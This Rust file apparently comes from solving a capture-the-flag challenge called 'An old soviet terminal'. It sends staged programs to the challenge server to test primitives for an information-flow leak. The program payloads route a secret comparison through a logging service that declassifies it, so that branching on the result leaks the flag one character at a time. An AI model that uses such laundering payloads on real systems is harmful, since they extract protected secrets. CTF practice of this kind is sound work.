// Piece-meal primitive validator for "An old soviet terminal".
//
// Each rung adds EXACTLY ONE primitive on top of the previous, and returns a PUBLIC
// constant so we isolate "does this primitive round-trip?" from "does the laundering
// branch work?". The first rung that never prints its constant (while an earlier rung
// did) is the broken primitive. If NO rung ever prints, the failure is upstream (the
// @receiver rendezvous never completes) and primitives can't be tested until a window.
//
//   rustc -O validate.rs -o validate && ./validate [N] [GAP]
// N = attempts per rung (break early on first success), GAP = backoff secs.
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant};
use std::{env, fs, thread};

const HOST: &str = "challs.nusgreyhats.org";
const PORT: u16 = 36167;
const FRAME_WAIT: Duration = Duration::from_secs(13); // frames arrive by ~11s; nothing later
const TAIL: Duration = Duration::from_secs(8);
const OUT: &str = "validate_results.md";

fn contains(h: &[u8], n: &[u8]) -> bool { !n.is_empty() && n.len() <= h.len() && h.windows(n.len()).any(|w| w == n) }

fn contains_any(h: &[u8], ns: &[&[u8]]) -> bool { ns.iter().any(|n| contains(h, n)) }

// like read_until but breaks as soon as ANY needle is present (used for the result
// read: we want to bail the instant the server says [BUSY] instead of waiting the
// full frame budget for a frame that will never come).
fn read_until_any(s: &mut TcpStream, needles: &[&[u8]], cap: Duration, buf: &mut Vec<u8>) {
    let mut tmp = [0u8; 8192];
    let t0 = Instant::now();
    loop {
        if t0.elapsed() >= cap { break; }
        match s.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => { buf.extend_from_slice(&tmp[..n]); if contains_any(buf, needles) { break; } }
            Err(e) => match e.kind() {
                std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => continue,
                _ => break,
            },
        }
    }
}

fn read_until(s: &mut TcpStream, needle: &[u8], cap: Duration, buf: &mut Vec<u8>) {
    let mut tmp = [0u8; 8192];
    let t0 = Instant::now();
    loop {
        if t0.elapsed() >= cap { break; }
        match s.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => { buf.extend_from_slice(&tmp[..n]); if contains(buf, needle) { break; } }
            Err(e) => match e.kind() {
                std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => continue,
                _ => break,
            },
        }
    }
}

fn attempt(addr: &std::net::SocketAddr, prog: &str) -> std::io::Result<String> {
    let mut s = TcpStream::connect_timeout(addr, Duration::from_secs(6))?;
    s.set_read_timeout(Some(Duration::from_millis(200)))?;
    s.set_write_timeout(Some(Duration::from_secs(8)))?;
    let mut buf = Vec::new();
    read_until(&mut s, b">>", Duration::from_secs(4), &mut buf);
    s.write_all(b"4\n")?; s.flush()?;
    buf.clear();
    read_until(&mut s, b">>", Duration::from_secs(4), &mut buf);
    s.write_all(prog.as_bytes())?; s.write_all(b"\nEOF\n")?; s.flush()?;
    buf.clear();
    // bail early on [BUSY] (server saturated, never renders a frame) OR on the frame.
    read_until_any(&mut s, &[b"TELETYPE OUTPUT", b"[BUSY]", b"queue is full"], FRAME_WAIT, &mut buf);
    read_until(&mut s, b"[1] Archive", TAIL, &mut buf);
    Ok(String::from_utf8_lossy(&buf).into_owned())
}

// (verdict, message-value-if-any)
fn verdict(out: &str) -> (&'static str, Option<String>) {
    if let Some(m) = out.lines().find(|l| l.contains("Message:"))
        .map(|l| l.replace('\u{2551}', "").split("Message:").nth(1).unwrap_or("").trim().to_string())
        .filter(|m| !m.is_empty()) {
        return ("MESSAGE", Some(m));
    }
    // server-side overload: bounced before our code ran. NOT a primitive failure.
    if out.contains("[BUSY]") || out.contains("queue is full") { return ("BUSY", None); }
    if out.contains("exceeded time allocation") || out.contains("[TIMEOUT]") { return ("TIMEOUT", None); }
    if out.contains("terminated abnormally") { return ("ERROR", None); }
    ("no-frame", None)
}

fn main() {
    let argv: Vec<String> = env::args().skip(1).collect();
    let n: usize = argv.get(0).and_then(|x| x.parse().ok()).unwrap_or(4);
    let gap: u64 = argv.get(1).and_then(|x| x.parse().ok()).unwrap_or(2);
    let addr = (HOST, PORT).to_socket_addrs().ok().and_then(|mut a| a.next()).expect("DNS");

    // (id, what-one-new-primitive-it-adds, expected-constant-or-char, program)
    let cs = "grey{}_etaoinshrdlcumwfgypbvkxjqz0123456789-!?.+=*ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let ladder: Vec<(&str, &str, &str, String)> = vec![
        ("T0 const", "terminal runs our code at all (no services)", "AAAA",
            "\"AAAA\"".into()),
        ("T1 analyze", "handshake + analysisService 'analyze' replies", "ANA",
            "send(analysisService,(\"analyze\",self()));receive[hn(\"analysis\",L)=>\"ANA\"]".into()),
        ("T1b length", "declassified length is usable (public int)", "#*len",
            "let val _=send(analysisService,(\"analyze\",self()))\nval n=receive[hn(\"analysis\",L)=>L]\nfun s i=if i>=n then \"\" else \"#\"^s(i+1)\nin s 0 end".into()),
        ("T2 compare", "analysisService 'compare' replies (secret bool NOT touched)", "CMP",
            "send(analysisService,(\"compare\",self(),0,\"g\"));receive[hn(\"comparison\",s)=>\"CMP\"]".into()),
        ("T3 log", "logService declassifies+replies (bool NOT branched)", "LOG",
            "let val _=send(analysisService,(\"compare\",self(),0,\"g\"))\nval s=receive[hn(\"comparison\",s)=>s]\nval _=send(logService,(\"log\",self(),s))\nval b=receive[hn(\"logged\",b)=>b]\nin \"LOG\" end".into()),
        ("T4 launder", "branch on the DECLASSIFIED bool (the actual leak)", "Y/N",
            "let val _=send(analysisService,(\"compare\",self(),0,\"g\"))\nval s=receive[hn(\"comparison\",s)=>s]\nval _=send(logService,(\"log\",self(),s))\nval b=receive[hn(\"logged\",b)=>b]\nin if b then \"Y\" else \"N\" end".into()),
        ("T5 char0", "full 1-char charset scan at index 0 (-> 'g')", "g",
            format!("let val cs=\"{cs}\"\nfun a j=substring(cs,j,j+1)\nfun p i d=(send(analysisService,(\"compare\",self(),i,d));receive[hn(\"comparison\",s)=>(send(logService,(\"log\",self(),s));receive[hn(\"logged\",b)=>b])])\nfun sc i j=if a j=\"\" then \"?\" else if p i(a j)then a j else sc i(j+1)\nin sc 0 0 end")),
    ];

    let mut md = String::from("## Piece-meal primitive validation (auto-generated)\n\n");
    md.push_str(&format!("Each rung adds ONE primitive; returns a public constant. n={n} attempts/rung, break on first success.\n\n"));
    md.push_str("| rung | new primitive tested | expect | best verdict | value | M/T/E/n/r/b |\n");
    md.push_str("|------|----------------------|--------|--------------|-------|-------------|\n");
    let _ = fs::write(OUT, &md);

    let busy_cap = n * 6; // generous: BUSY doesn't burn an attempt, but cap total retries

    for (id, what, expect, prog) in &ladder {
        let (mut m, mut t, mut e, mut nf, mut r, mut b) = (0, 0, 0, 0, 0, 0);
        let mut got: Option<String> = None;
        println!("\n=== {id}: {what}  (expect {expect}, {} bytes) ===", prog.len());
        let mut i = 0;
        while i < n {
            let t0 = Instant::now();
            match attempt(&addr, prog) {
                Err(_) => { r += 1; i += 1; println!("  [{i}/{n}] refused ({:.1}s)", t0.elapsed().as_secs_f32());
                    thread::sleep(Duration::from_secs(gap)); }
                Ok(out) => {
                    let (v, val) = verdict(&out);
                    if v == "BUSY" {
                        b += 1;
                        println!("  [busy {b}/{busy_cap}] saturated, retry (no charge) ({:.1}s)", t0.elapsed().as_secs_f32());
                        if b >= busy_cap { println!("  -> rung abandoned: server saturated all retries"); break; }
                        thread::sleep(Duration::from_secs(gap.max(3) * 2)); // longer backoff on BUSY
                        continue; // do NOT advance i: BUSY is not a real sample
                    }
                    match v { "MESSAGE" => m += 1, "TIMEOUT" => t += 1, "ERROR" => e += 1, _ => nf += 1 }
                    i += 1;
                    println!("  [{i}/{n}] {v}{} ({:.1}s)", val.as_ref().map(|x| format!(" = {x:?}")).unwrap_or_default(), t0.elapsed().as_secs_f32());
                    if v == "MESSAGE" { got = val; break; } // primitive proven; stop sampling
                    thread::sleep(Duration::from_secs(gap));
                }
            }
        }
        let best = if got.is_some() { "MESSAGE" } else if e > 0 { "ERROR" } else if t > 0 { "TIMEOUT" } else if nf > 0 { "no-frame" } else if b >= busy_cap { "BUSY" } else { "refused" };
        let row = format!("| {id} | {what} | `{expect}` | **{best}** | {} | {m}/{t}/{e}/{nf}/{r}/{b} |\n",
            got.as_deref().map(|x| format!("`{x}`")).unwrap_or_else(|| "—".into()));
        md.push_str(&row);
        let _ = fs::write(OUT, &md); // incremental persist so partial runs survive
        println!("  -> best={best} value={:?}", got);
    }
    md.push_str("\n**Counts** = MESSAGE / TIMEOUT / ERROR / no-frame / refused / BUSY.\n");
    md.push_str("**Reading:** first rung that fails while a prior rung shows `MESSAGE` = the broken primitive. All-`TIMEOUT`/`ERROR` with zero `MESSAGE` = rendezvous never completed. `BUSY` (`[BUSY] Transmission queue is full`) = server bounced us before our code ran — not a primitive failure, retried without charge; an all-`BUSY` rung means the terminal was saturated the whole window (try later).\n");
    let _ = fs::write(OUT, &md);
    println!("\n[validate] wrote {OUT}");
}
